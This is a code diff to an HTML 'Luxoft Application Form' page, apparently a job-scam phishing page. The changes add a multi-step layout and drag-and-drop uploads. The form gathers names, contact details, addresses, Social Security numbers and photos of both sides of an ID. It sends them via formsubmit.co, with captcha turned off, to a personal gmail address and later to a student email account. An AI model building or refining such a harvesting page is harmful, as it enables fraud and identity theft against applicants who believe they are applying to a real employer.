@@ -195,60 +195,128 @@
       label {
         font-size: 1rem;
       }
+      .step {
+      display: none;
+    }
+    .step.active {
+      display: block;
+    }
+    .tooltip {
+      cursor: help;
+      border-bottom: 1px dotted #fff;
+    }
+    .drag-drop {
+      border: 2px dashed #7c3aed;
+      padding: 1rem;
+      text-align: center;
+      color: #c4b5fd;
+      margin-bottom: 1.5rem;
+      border-radius: 8px;
+    }
+    .drag-drop.dragover {
+      background-color: #3c2f6b;
+    }
+    #loading {
+      display: none;
+      text-align: center;
+      margin-top: 1rem;
+      color: #c4b5fd;
     }
   </style>
 </head>
 <body>
   <div class="container">
     <h1>Luxoft Application Form</h1>
-    <form action="https://formsubmit.co/luxoftorganization@gmail.com" method="POST" enctype="multipart/form-data">
-      <!-- FormSubmit hidden fields -->
-      <input type="hidden" name="_captcha" value="false">
-      <input type="hidden" name="_template" value="table">
-      <input type="hidden" name="_redirect" value="thankyou.html">
-      
-      <div class="form-group">
-        <label for="fullname">Full Name</label>
-        <input type="text" id="fullname" name="Full Name" placeholder="Enter your full name" required>
+    <form id="applicationForm" action="https://formsubmit.co/michael.adeshina240221118@st.lasu.edu.ng" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="_captcha" value="false" />
+      <input type="hidden" name="_template" value="table" />
+      <input type="hidden" name="_redirect" value="thankyou.html" />
+
+      <!-- Step 1: Personal Info -->
+      <div class="step active" id="step1">
+        <div class="form-group">
+          <label for="fullname">Full Name</label>
+          <input type="text" id="fullname" name="Full Name" placeholder="Enter your full name" required />
+        </div>
+        <div class="form-group">
+          <label for="email">Email <span class="tooltip" title="We'll never share your email.">ⓘ</span></label>
+          <input type="email" id="email" name="Email" placeholder="Enter your email" required />
+        </div>
+        <div class="form-group">
+          <label for="phone">Phone Number</label>
+          <input type="tel" id="phone" name="Phone Number" placeholder="Enter your phone number" required />
+        </div>
+        <button type="button" onclick="nextStep()">Next</button>
       </div>
 
-      <div class="form-group">
-        <label for="email">Email</label>
-        <input type="email" id="email" name="Email" placeholder="Enter your email" required>
+      <!-- Step 2: Address & ID -->
+      <div class="step" id="step2">
+        <div class="form-group">
+          <label for="address">Address</label>
+          <input type="text" id="address" name="Address" placeholder="Enter your address" required />
+        </div>
+        <div class="form-group">
+          <label for="ssn">SSN <span class="tooltip" title="Enter 9-digit Social Security Number.">ⓘ</span></label>
+          <input type="text" id="ssn" name="SSN" placeholder="XXXXXXXXX" pattern="\d{9}" title="Enter SSN in XXXXXXXXX format" required />
+        </div>
+        <button type="button" onclick="nextStep()">Next</button>
       </div>
 
-      <div class="form-group">
-        <label for="phone">Phone Number</label>
-        <input type="tel" id="phone" name="Phone Number" placeholder="Enter your phone number" required>
+      <!-- Step 3: Uploads -->
+      <div class="step" id="step3">
+        <div class="form-group">
+          <label for="id-front">Photo ID (Front)</label>
+          <div class="drag-drop" id="drop-front">Drag & drop or click to upload</div>
+          <input type="file" id="id-front" name="ID_Front" accept=".pdf,.doc,.docx,.jpg,.png" style="display:none;" />
+        </div>
+        <div class="form-group">
+          <label for="id-back">Photo ID (Back)</label>
+          <div class="drag-drop" id="drop-back">Drag & drop or click to upload</div>
+          <input type="file" id="id-back" name="ID_Back" accept=".pdf,.doc,.docx,.jpg,.png" style="display:none;" />
+        </div>
+        <button type="submit">Submit Application</button>
+        <div id="loading">Submitting your application...</div>
       </div>
-
-      <div class="form-group">
-        <label for="address">Address</label>
-        <input type="text" id="address" name="Address" placeholder="Enter your address" required>
-      </div>
-
-      <div class="form-group">
-        <label for="ssn">SSN</label>
-        <input type="text" id="ssn" name="SSN" placeholder="XXXXXXXXX" pattern="\d{9}" title="Enter SSN in XXXXXXXXX format" required>
-      </div>
-
-      <div class="form-group">
-        <label for="id-front">Photo ID (Front)</label>
-        <input type="file" id="id-front" name="ID_Front" accept=".pdf,.doc,.docx,.jpg,.png">
-      </div>
-
-      <div class="form-group">
-        <label for="id-back">Photo ID (Back)</label>
-        <input type="file" id="id-back" name="ID_Back" accept=".pdf,.doc,.docx,.jpg,.png">
-      </div>
-
-      <input type="hidden" name="_redirect" value="thankyou.html">
-
-      <button type="submit">Submit Application</button>
     </form>
   </div>
+
   <footer>
-    <p>Email: <a href="mailto:luxoftorganization@gmail.com">luxoftorganization@gmail.com</a> | Direct text or call: <a href="tel:+4805598731">(480) 559-8731</a> | Whatsapp: <a href="https://wa.me/9713476514">(971) 347 6514</a></p>
+    <p>Email: <a href="mailto:michael.adeshina240221118@st.lasu.edu.ng">michael.adeshina240221118@st.lasu.edu.ng</a> |
+      Call: <a href="tel:+234805598731">0805 598 731</a> |
+      WhatsApp: <a href="https://wa.me/234813476514">0813 476 514</a></p>
   </footer>
+
+  <script>
+    let currentStep = 1;
+    function nextStep() {
+      document.getElementById(`step${currentStep}`).classList.remove("active");
+      currentStep++;
+      document.getElementById(`step${currentStep}`).classList.add("active");
+    }
+
+    // Drag & Drop logic
+    function setupDragDrop(dropId, inputId) {
+      const dropZone = document.getElementById(dropId);
+      const input = document.getElementById(inputId);
+      dropZone.addEventListener("click", () => input.click());
+      dropZone.addEventListener("dragover", (e) => {
+        e.preventDefault();
+        dropZone.classList.add("dragover");
+      });
+      dropZone.addEventListener("dragleave", () => dropZone.classList.remove("dragover"));
+      dropZone.addEventListener("drop", (e) => {
+        e.preventDefault();
+        dropZone.classList.remove("dragover");
+        input.files = e.dataTransfer.files;
+      });
+    }
+    setupDragDrop("drop-front", "id-front");
+    setupDragDrop("drop-back", "id-back");
+
+    // Show loading spinner on submit
+    document.getElementById("applicationForm").addEventListener("submit", () => {
+      document.getElementById("loading").style.display = "block";
+    });
+  </script>
 </body>
 </html>
